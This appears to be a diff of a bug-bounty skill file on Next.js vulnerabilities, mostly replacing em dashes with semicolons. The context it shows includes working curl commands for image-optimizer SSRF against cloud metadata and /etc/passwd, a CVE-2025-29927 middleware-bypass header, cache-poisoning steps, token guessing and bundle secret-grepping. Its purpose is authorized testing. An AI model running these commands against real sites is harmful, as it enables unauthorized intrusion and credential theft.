@@ -29,7 +29,7 @@ report_count: 0
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities
+# HUNT-NEXTJS: Next.js / SSR Framework Vulnerabilities
 
 Historical version ranges and exploit snippets require the exact framework/router/runtime/hosting conditions from primary advisories. HTTP 200 or non-404 alone never establishes access bypass, dev mode or a vulnerability; validate content against authenticated/unauthenticated controls and intended policy. Use synthetic identities and records, bounded request budgets and an approved callback receiver. Cache poisoning, revalidation, internal metadata access and mutation require separate exact-action scope. Do not access real victim sessions/data or use discovered credentials.
 
@@ -38,29 +38,29 @@ Historical version ranges and exploit snippets require the exact framework/route
 Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.
 
 **Highest-value chains:**
-- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
-- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
-- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
-- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
-- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client
+- **Server Actions auth bypass**; Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
+- **Middleware bypass via `/_next/static/`**; middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
+- **`/_next/image` SSRF**; Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
+- **ISR stale cache poisoning**; inject malicious content into a cached page that gets served to all users
+- **RSC payload leakage**; React Server Component flight data contains server-side props not meant for client
 
 ---
 
 ## Attack Surface Signals
 
 ```
-/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
-/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
+/_next/image?url=&w=&q=          Image optimizer; SSRF candidate
+/_next/data/BUILD_ID/*.json      Prerendered page data; IDOR candidate
 /__nextjs_original-stack-frame   Debug stack frame endpoint
-/_next/static/chunks/            JS bundles — source map candidate
-/api/                            API routes — standard hunt surface
+/_next/static/chunks/            JS bundles; source map candidate
+/api/                            API routes; standard hunt surface
 __NEXT_DATA__ in HTML            SSR props leaked to client
 x-nextjs-* response headers      Confirms Next.js
 ```
 
 ---
 
-## Phase 1 — Fingerprint & Version Detection
+## Phase 1: Fingerprint & Version Detection
 
 ```bash
 # Confirm Next.js and get build ID
@@ -81,7 +81,7 @@ curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
 
 ---
 
-## Phase 2 — Server Actions Abuse
+## Phase 2: Server Actions Abuse
 
 ```bash
 # Server Actions in Next.js 14+ use x-action-id or Next-Action header
@@ -102,7 +102,7 @@ curl -s -X POST https://$TARGET/target-page \
 
 ---
 
-## Phase 3 — Middleware Auth Bypass
+## Phase 3: Middleware Auth Bypass
 
 ```bash
 # Next.js middleware runs on edge runtime and may skip certain paths
@@ -110,7 +110,7 @@ curl -s -X POST https://$TARGET/target-page \
 curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
 # A 200 may be a login page or public shell; inspect authorized content and controls.
 
-# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
+# Test via /_next/data/ (SSG/ISR JSON): middleware may not apply
 curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"
 
 # Test via static asset path prefix (middleware matcher may exclude /_next/static)
@@ -124,7 +124,7 @@ curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
 ---
 
 ### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)
-Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.
+Next skips middleware execution entirely when this header asserts an internal subrequest; bypassing auth/redirect middleware on gated routes.
 ```bash
 curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
   -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
@@ -132,17 +132,17 @@ curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
 # Confirm protected content/action without authorization; status alone is insufficient. Historical fixes: 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
 ```
 
-## Phase 4 — Image Optimization SSRF (`/_next/image`)
+## Phase 4: Image Optimization SSRF (`/_next/image`)
 
 ```bash
-# Basic SSRF test — internal metadata
+# Basic SSRF test: internal metadata
 curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
 
 # Protocol bypass attempts
 curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
 curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"
 
-# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
+# OOB detection: use a UNIQUE per-test subdomain so callbacks can't be confused
 COLLAB="http://UNIQUE.COLLAB_HOST"
 curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
 # Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
@@ -150,7 +150,7 @@ curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
 
 **FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
 fetches URLs allowed by `images.remotePatterns` / `images.domains` in
-`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
+`next.config.js`. A non-whitelisted `url` returns **400 by default**; that is
 the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
 returns an *optimized image*, not the upstream response body, so a status code
 alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
@@ -158,14 +158,14 @@ Collaborator subdomain** (above), or by body-diffing a known-internal vs
 known-external target. Do not report on status code.
 
 > Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
-> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
-> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
+> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF; a relative
+> redirect that trusts the `Host` header; NOT a `/_next/image` bug, and it does
 > NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
 > Actions surface.
 
 ---
 
-## Phase 5 — `/_next/data/` IDOR & Data Leakage
+## Phase 5: `/_next/data/` IDOR & Data Leakage
 
 ```bash
 # Enumerate prerendered JSON for user-specific data
@@ -185,7 +185,7 @@ curl -s "https://$TARGET/dashboard" | \
 
 ---
 
-## Phase 6 — ISR Cache Poisoning
+## Phase 6: ISR Cache Poisoning
 
 ```bash
 # ISR pages regenerate on request after revalidation period
@@ -200,7 +200,7 @@ MARK="zqx$(date +%s)"
 # 1) Poison with the marker
 curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
 # 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
-#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
+#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers: a reflected
 #    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
 curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"
 
@@ -211,11 +211,11 @@ curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
 
 ---
 
-## Phase 7 — Debug & Stack Frame Endpoints
+## Phase 7: Debug & Stack Frame Endpoints
 
 **Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
 are react-dev-overlay middleware mounted ONLY under `next dev`. A production
-build (`next build && next start`) does not register these routes — a 404 here
+build (`next build && next start`) does not register these routes; a 404 here
 is the normal, expected result, not a "filter" you need to bypass. They are
 reachable ONLY in the rare misconfiguration of literally running `next dev` in
 production. Treat a non-404 as a candidate requiring version, content and route verification; a custom fallback can return 200 for every path.
@@ -234,10 +234,10 @@ curl -s "https://$TARGET/__nextjs_original-stack-frame" \
 
 ---
 
-## Phase 8 — Environment Variable Leakage
+## Phase 8: Environment Variable Leakage
 
 ```bash
-# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
+# NEXT_PUBLIC_* vars are baked into JS bundles: grep for secrets
 curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
   grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"
 
@@ -282,7 +282,7 @@ if m:
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
 
 ## Limitations
 
